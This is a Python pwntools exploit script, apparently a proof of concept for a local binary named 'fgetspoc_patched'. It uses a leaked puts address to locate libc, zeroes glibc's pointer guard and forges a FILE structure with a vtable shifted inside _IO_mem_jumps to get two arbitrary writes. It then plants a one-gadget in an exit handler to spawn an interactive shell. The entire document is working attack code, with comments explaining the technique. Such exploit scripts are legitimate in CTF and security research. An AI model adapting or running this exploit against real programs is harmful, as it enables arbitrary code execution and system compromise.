from pwn import *

elf = context.binary = ELF('fgetspoc_patched', checksec = False)
libc = ELF('libc.so.6', checksec = False)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = '''
                set breakpoint pending on
                b __run_exit_handlers
        ''')
    else:
        return process(elf.path)

io = start()

io.recvuntil(b'libc leak: ') # skip blah blah
puts_leak = int(io.recvline(keepends = False), base = 16)
success(f'puts @ 0x{puts_leak:02x}')

libc.address = puts_leak - libc.sym.puts
success(f'libc @ 0x{libc.address:02x}')

where = libc.address - 0x2890 # overwrite the pointer guard.
what = 0x0

one_gadget = libc.address + 0xdb181

where2 = libc.sym.initial+24
what2 = one_gadget
what2 = rol(n = what2, k = 0x11, word_size = 64) # overwrite _IO_cleanup exti handler with a one gadget!

_IO_USER_BUF = 0x0001

_flags = p32(_IO_USER_BUF)
_flags_byte_hole = p32(0x0)
_IO_read_ptr = 0x0
_IO_read_end = 0x0
_IO_read_base = 0x0
_IO_write_base = what
_IO_write_ptr = _IO_write_base + what2
_IO_write_end = 0x0
_IO_buf_base = 0x0
_IO_buf_end = 0x0
_IO_save_base = 0x0
_IO_backup_base = 0x0
_IO_save_end = 0x0
_markers = 0x0

_chain = 0x0

_fileno = p32(0x0)
_flags2 = p32(0x0)
_old_offset = 0x0
_cur_column = p16(0x0)
_vtable_offset = p8(0x0)
_shortbuf = p8(0x0)
_shortbuf_byte_hole = p32(0x0)
_lock = libc.address + 0x1f21f8
_offset = 0x0
_codecvt = 0x0
_wide_data = _lock
_freeres_list = 0x0
_freeres_buf = 0x0
__pad5 = 0x0
_mode = p32(0x0)
_unused2 = b'\x00'*0x14

# here is the trick, by shifting the vtable in the range of __libc_IO_vtables we are not aborting the program, it is totally allowed.
vtable = libc.sym._IO_mem_jumps + 0x38  # now _IO_UNDERFLOW points to _IO_mem_sync, our magical two arbitrary write function ;)

fs = _flags + _flags_byte_hole + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base) + p64(_IO_write_base) + p64(_IO_write_ptr) \
   + p64(_IO_write_end) + p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end) \
   + p64(_markers) + p64(_chain) + _fileno + _flags2 + p64(_old_offset) + _cur_column + _vtable_offset + _shortbuf + _shortbuf_byte_hole + p64(_lock) + p64(_offset) \
   + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf) + p64(__pad5) + _mode + _unused2 \
   + p64(vtable)

fix_fs_chunk_size = 0x1e1 # we want to fix chunk size fields to avoid aborting.
exploit = fit({
    0x18: p64(fix_fs_chunk_size) + fs + p64(0)*2 + p64(where) + p64(where2)
})

io.send(exploit)

io.interactive()